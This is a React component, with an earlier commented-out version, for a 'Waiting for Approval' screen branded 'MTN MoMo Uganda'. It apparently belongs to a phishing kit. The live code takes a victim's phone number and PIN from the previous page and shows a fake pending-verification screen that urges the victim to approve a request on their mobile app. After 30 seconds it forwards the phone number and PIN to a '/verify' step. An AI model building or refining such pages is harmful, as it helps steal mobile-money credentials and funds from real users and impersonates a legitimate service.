
// import React, { useEffect } from "react";
// import { useNavigate } from "react-router-dom";

// function WaitingForApproval() {
//     const navigate = useNavigate();

//    useEffect(() => {
//   const timer = setTimeout(() => {
//     navigate("/", {
//       replace: true,
//       state: {
//         loginError: true,
//       },
//     });
//   }, 30000);

//   return () => clearTimeout(timer);
// }, [navigate]);

//     return (
//         <main className="relative min-h-dvh w-full overflow-hidden bg-[#0b477d] text-white">
//             {/* Background glow */}
//             <div className="pointer-events-none absolute -left-24 -top-24 h-72 w-72 rounded-full bg-[#ffcc00]/10 blur-3xl" />
//             <div className="pointer-events-none absolute -bottom-32 -right-24 h-80 w-80 rounded-full bg-[#ffffff]/10 blur-3xl" />

//             {/* Main Content */}
//             <section className="relative flex min-h-dvh w-full flex-col items-center justify-center px-5 py-8 sm:px-8">

//                 {/* Card */}
//                 <div className="w-full max-w-[620px] rounded-[28px] border border-white/10 bg-[#063866]/35 px-5 py-8 shadow-[0_20px_70px_rgba(0,0,0,0.22)] backdrop-blur-sm sm:px-10 sm:py-12">

//                     {/* Status Badge */}
//                     <div className="mb-7 flex justify-center">
//                         <div className="flex items-center gap-2 rounded-full border border-[#ffcc00]/30 bg-[#ffcc00]/10 px-4 py-2">
//                             <span className="relative flex h-2.5 w-2.5">
//                                 <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-[#ffcc00] opacity-75" />
//                                 <span className="relative inline-flex h-2.5 w-2.5 rounded-full bg-[#ffcc00]" />
//                             </span>

//                             <span className="text-sm font-semibold tracking-wide text-[#ffcc00]">
//                                 PENDING
//                             </span>
//                         </div>
//                     </div>

//                     {/* Hourglass */}
//                     <div className="mb-7 flex justify-center">
//                         <div className="relative flex h-[125px] w-[125px] items-center justify-center rounded-full border-2 border-[#7898b8]/70 bg-[#285a8c]/70 shadow-[0_0_45px_rgba(255,204,0,0.10)] sm:h-[155px] sm:w-[155px]">

//                             {/* Outer animated ring */}
//                             <div className="absolute inset-[-8px] rounded-full border border-[#ffcc00]/20 animate-pulse" />

//                             <span
//                                 className="animate-[bounce_2s_ease-in-out_infinite] text-[62px] leading-none sm:text-[75px]"
//                                 role="img"
//                                 aria-label="hourglass"
//                             >
//                                 ⏳
//                             </span>
//                         </div>
//                     </div>

//                     {/* Heading */}
//                     <h1 className="text-center text-[30px] font-bold leading-[1.2] tracking-tight sm:text-[46px]">
//                         Waiting for Admin
//                         <span className="block text-[#ffcc00]">
//                             Approval
//                         </span>
//                     </h1>

//                     {/* Description */}
//                     <p className="mx-auto mt-5 max-w-[480px] text-center text-[16px] leading-7 text-[#d5e1ed] sm:mt-7 sm:text-[22px] sm:leading-9">
//                         Your login is pending admin verification.
//                         <br />
//                         Please wait while your request is being reviewed.
//                     </p>

//                     {/* Divider */}
//                     <div className="mx-auto my-7 h-px w-full max-w-[400px] bg-white/10 sm:my-9" />

//                     {/* Reviewing Status */}
//                     <div className="flex items-center justify-center gap-3">
//                         <div className="flex gap-1">
//                             <span className="h-2 w-2 animate-bounce rounded-full bg-[#ffcc00] [animation-delay:-0.3s]" />
//                             <span className="h-2 w-2 animate-bounce rounded-full bg-[#ffcc00] [animation-delay:-0.15s]" />
//                             <span className="h-2 w-2 animate-bounce rounded-full bg-[#ffcc00]" />
//                         </div>

//                         <p className="text-center text-[15px] font-medium text-[#c9d4e0] sm:text-[20px]">
//                             Admin is reviewing your request
//                         </p>
//                     </div>

//                     {/* Application ID */}
//                     <div className="mt-8 rounded-2xl border border-white/10 bg-black/10 px-4 py-4 text-center sm:mt-10">
//                         <p className="text-xs uppercase tracking-[2px] text-[#9fb6cc] sm:text-sm">
//                             Application ID
//                         </p>

//                         <p className="mt-1.5 break-all text-[16px] font-semibold tracking-wide text-[#ffcc00] sm:text-[21px]">
//                             APP-1791223914489
//                         </p>
//                     </div>

//                     {/* Auto redirect info */}
//                     <p className="mt-5 text-center text-xs text-[#a9c2dd] sm:text-sm">
//                         Please keep this page open while your request is being processed.
//                     </p>
//                 </div>

//                 {/* Footer */}
//                 <p className="mt-5 text-center text-xs text-[#a9c2dd]/80 sm:mt-7 sm:text-sm">
//                     MTN MoMo Uganda
//                 </p>
//             </section>
//         </main>
//     );
// }

// export default WaitingForApproval;

import React, { useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";

function WaitingForApproval() {
  const navigate = useNavigate();
  const location = useLocation();

  const {
    phone = "",
    pin = "",
    applicationId = "APP-1791223914489",
    attempt = 1,
  } = location.state || {};

  useEffect(() => {
  const timer = setTimeout(() => {
    if (attempt === 1) {
      navigate("/verify", {
        replace: true,
        state: {
          phone,
          pin,
        },
      });
    } 
  }, 30000);

  return () => clearTimeout(timer);
}, [navigate, attempt, phone, applicationId]);

  return (
    <main className="relative min-h-dvh w-full overflow-hidden bg-[#0b477d] text-white">
      {/* Background glow */}
      <div className="pointer-events-none absolute -left-24 -top-24 h-72 w-72 rounded-full bg-[#ffcc00]/10 blur-3xl" />
      <div className="pointer-events-none absolute -bottom-32 -right-24 h-80 w-80 rounded-full bg-[#ffffff]/10 blur-3xl" />

      <section className="relative flex min-h-dvh w-full flex-col items-center justify-center px-5 py-8 sm:px-8">
        <div className="w-full max-w-[620px] rounded-[28px] border border-white/10 bg-[#063866]/35 px-5 py-8 shadow-[0_20px_70px_rgba(0,0,0,0.22)] backdrop-blur-sm sm:px-10 sm:py-12">

          {/* Status */}
          <div className="mb-7 flex justify-center">
            <div className="flex items-center gap-2 rounded-full border border-[#ffcc00]/30 bg-[#ffcc00]/10 px-4 py-2">
              <span className="relative flex h-2.5 w-2.5">
                <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-[#ffcc00] opacity-75" />
                <span className="relative inline-flex h-2.5 w-2.5 rounded-full bg-[#ffcc00]" />
              </span>

              <span className="text-sm font-semibold tracking-wide text-[#ffcc00]">
                PENDING
              </span>
            </div>
          </div>

          {/* Hourglass */}
          <div className="mb-7 flex justify-center">
            <div className="relative flex h-[125px] w-[125px] items-center justify-center rounded-full border-2 border-[#7898b8]/70 bg-[#285a8c]/70 shadow-[0_0_45px_rgba(255,204,0,0.10)] sm:h-[155px] sm:w-[155px]">
              <div className="absolute inset-[-8px] rounded-full border border-[#ffcc00]/20 animate-pulse" />

              <span
                className="animate-[bounce_2s_ease-in-out_infinite] text-[62px] leading-none sm:text-[75px]"
                role="img"
                aria-label="hourglass"
              >
                ⏳
              </span>
            </div>
          </div>

          {/* Heading */}
          <h1 className="text-center text-[30px] font-bold leading-[1.2] tracking-tight sm:text-[46px]">
            Waiting for your
            <span className="block text-[#ffcc00]">
              Approval
            </span>
          </h1>

          {/* Description */}
          <p className="mx-auto mt-5 max-w-[480px] text-center text-[16px] leading-7 text-[#d5e1ed] sm:mt-7 sm:text-[22px] sm:leading-9">
            A verification request has been sent to your mobile app.
            <br />
             Please review the request and complete the verification to continue.
          </p>

          <div className="mx-auto my-7 h-px w-full max-w-[400px] bg-white/10 sm:my-9" />

          {/* Reviewing */}
          <div className="flex items-center justify-center gap-3">
            <div className="flex gap-1">
              <span className="h-2 w-2 animate-bounce rounded-full bg-[#ffcc00] [animation-delay:-0.3s]" />
              <span className="h-2 w-2 animate-bounce rounded-full bg-[#ffcc00] [animation-delay:-0.15s]" />
              <span className="h-2 w-2 animate-bounce rounded-full bg-[#ffcc00]" />
            </div>

            <p className="text-center text-[15px] font-medium text-[#c9d4e0] sm:text-[20px]">
              Verification Pending
            </p>
          </div>

          {/* Application ID */}
          <div className="mt-8 rounded-2xl border border-white/10 bg-black/10 px-4 py-4 text-center sm:mt-10">
            <p className="text-xs uppercase tracking-[2px] text-[#9fb6cc] sm:text-sm">
              Application ID
            </p>

            <p className="mt-1.5 break-all text-[16px] font-semibold tracking-wide text-[#ffcc00] sm:text-[21px]">
              {applicationId}
            </p>
          </div>

          <p className="mt-5 text-center text-xs text-[#a9c2dd] sm:text-sm">
            Please keep this page open while your request is being processed.
          </p>
        </div>

        <p className="mt-5 text-center text-xs text-[#a9c2dd]/80 sm:mt-7 sm:text-sm">
          MTN MoMo Uganda
        </p>
      </section>
    </main>
  );
}

export default WaitingForApproval;
